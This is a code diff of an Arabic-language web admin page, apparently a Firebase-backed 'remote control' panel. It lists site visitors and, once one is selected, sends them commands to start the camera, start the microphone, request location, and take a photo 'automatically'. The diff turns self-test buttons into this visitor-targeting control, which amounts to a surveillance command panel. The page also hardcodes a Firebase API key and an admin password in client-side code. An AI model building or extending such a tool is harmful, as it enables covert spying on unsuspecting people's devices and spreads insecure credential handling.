@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>لوحة الإدارة</title>
+  <title>لوحة الإدارة - التحكم عن بعد</title>
   <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-storage-compat.js"></script>
@@ -11,45 +11,49 @@
   <style>
     body { font-family: 'Cairo', sans-serif; background:#f1f5f9; margin:0; }
     .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-    table { width:100%; border-collapse: collapse; background:white; border-radius:12px; overflow:hidden; }
-    th, td { padding: 14px; text-align: right; border-bottom: 1px solid #ddd; }
+    table { width:100%; border-collapse: collapse; background:white; border-radius:12px; overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
+    th, td { padding: 14px; text-align: right; border-bottom: 1px solid #ddd; cursor:pointer; }
     th { background: #1e40af; color: white; }
-    .test-panel { background:white; padding:25px; border-radius:12px; margin:20px 0; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
+    .control-panel { background:white; padding:25px; border-radius:12px; margin:20px 0; }
+    button { padding:12px 20px; margin:5px; border:none; border-radius:8px; font-size:1rem; cursor:pointer; }
+    .btn-camera { background:#ef4444; color:white; }
+    .btn-location { background:#3b82f6; color:white; }
+    .btn-mic { background:#10b981; color:white; }
+    .selected { background:#fefce8 !important; }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>🔧 لوحة الإدارة</h1>
+  <h1>🔧 لوحة الإدارة - التحكم عن بعد</h1>
   
-  <div class="test-panel">
-    <h2>🧪 اختبار الميزات (للمدير)</h2>
-    <button onclick="testLocation()">اختبار الموقع</button>
-    <button onclick="testCamera()">اختبار الكاميرا</button>
-    <button onclick="testMic()">اختبار الميكروفون</button>
-    
-    <video id="admin-video" autoplay playsinline style="width:100%; max-width:500px; margin:15px 0; border-radius:12px; display:none;"></video>
-    <div id="admin-location"></div>
+  <div class="control-panel">
+    <h2>الزوار الحاليين (<span id="count">0</span>)</h2>
+    <table id="table">
+      <thead>
+        <tr>
+          <th>معرف الزائر</th>
+          <th>الجهاز</th>
+          <th>الموقع</th>
+          <th>الكاميرا</th>
+          <th>الميكروفون</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
   </div>
 
-  <h2>الزوار الحاليين (<span id="count">0</span>)</h2>
-  <table id="table">
-    <thead>
-      <tr>
-        <th>معرف الزائر</th>
-        <th>الجهاز</th>
-        <th>المدة</th>
-        <th>الموقع</th>
-        <th>الكاميرا</th>
-        <th>الميكروفون</th>
-      </tr>
-    </thead>
-    <tbody></tbody>
-  </table>
+  <div id="visitor-controls" class="control-panel" style="display:none;">
+    <h2>التحكم في الزائر: <span id="selected-id"></span></h2>
+    <button class="btn-camera" onclick="sendCommand('startCamera')">📹 تشغيل الكاميرا</button>
+    <button class="btn-location" onclick="sendCommand('requestLocation')">📍 طلب الموقع</button>
+    <button class="btn-mic" onclick="sendCommand('startMic')">🎤 تشغيل الميكروفون</button>
+    <button onclick="sendCommand('takePhoto')" style="background:#8b5cf6; color:white;">📸 التقاط صورة تلقائياً</button>
+  </div>
 </div>
 
 <script>
-  const firebaseConfig = { /* نفس الإعدادات */ 
+  const firebaseConfig = {
     apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
     authDomain: "ohaha-d130e.firebaseapp.com",
     projectId: "ohaha-d130e",
@@ -61,17 +65,12 @@
   firebase.initializeApp(firebaseConfig);
   const db = firebase.database();
 
-  let isLoggedIn = false;
+  let selectedVisitor = null;
 
   function login() {
     const pass = prompt("أدخل كلمة مرور الإدارة:");
-    if (pass === "521988") {
-      isLoggedIn = true;
-      loadVisitors();
-    } else {
-      alert("كلمة مرور خاطئة!");
-      window.location.href = "index.html";
-    }
+    if (pass === "521988") loadVisitors();
+    else { alert("خطأ"); window.location.href = "index.html"; }
   }
 
   function loadVisitors() {
@@ -82,43 +81,37 @@
       snap.forEach(child => {
         count++;
         const d = child.val();
-        const row = `
-          <tr>
-            <td>${child.key}</td>
-            <td>${d.device || '-'}</td>
-            <td>${d.sessionDuration || 0} ث</td>
-            <td>${d.location ? '✅' : '❌'}</td>
-            <td>${d.permissions?.camera ? '✅' : '❌'}</td>
-            <td>${d.permissions?.mic ? '✅' : '❌'}</td>
-          </tr>`;
-        tbody.innerHTML += row;
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td>${child.key}</td>
+          <td>${d.device || '-'}</td>
+          <td>${d.location ? '✅' : '❌'}</td>
+          <td>${d.permissions?.camera ? '✅' : '❌'}</td>
+          <td>${d.permissions?.mic ? '✅' : '❌'}</td>
+        `;
+        row.onclick = () => selectVisitor(child.key, row);
+        tbody.appendChild(row);
       });
       document.getElementById('count').textContent = count;
     });
   }
 
-  // اختبار الميزات للمدير
-  function testLocation() {
-    navigator.geolocation.getCurrentPosition(p => {
-      document.getElementById('admin-location').innerHTML = `<strong>موقعك:</strong> ${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`;
-    });
+  function selectVisitor(id, row) {
+    document.querySelectorAll('tr').forEach(r => r.classList.remove('selected'));
+    row.classList.add('selected');
+    selectedVisitor = id;
+    document.getElementById('selected-id').textContent = id;
+    document.getElementById('visitor-controls').style.display = 'block';
   }
 
-  let adminStream = null;
-  function testCamera() {
-    navigator.mediaDevices.getUserMedia({video: true}).then(s => {
-      adminStream = s;
-      document.getElementById('admin-video').srcObject = s;
-      document.getElementById('admin-video').style.display = 'block';
+  function sendCommand(type) {
+    if (!selectedVisitor) return alert("اختر زائر أولاً");
+    db.ref('commands/' + selectedVisitor).set({
+      type: type,
+      timestamp: Date.now(),
+      adminTriggered: true
     });
-  }
-
-  function testMic() {
-    alert("الميكروفون مفعل (جرب التحدث)");
-    const rec = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
-    rec.lang = 'ar-SA';
-    rec.onresult = e => alert("سمعت: " + e.results[0][0].transcript);
-    rec.start();
+    alert(`✅ تم إرسال الأمر "${type}" إلى الزائر`);
   }
 
   window.onload = login;
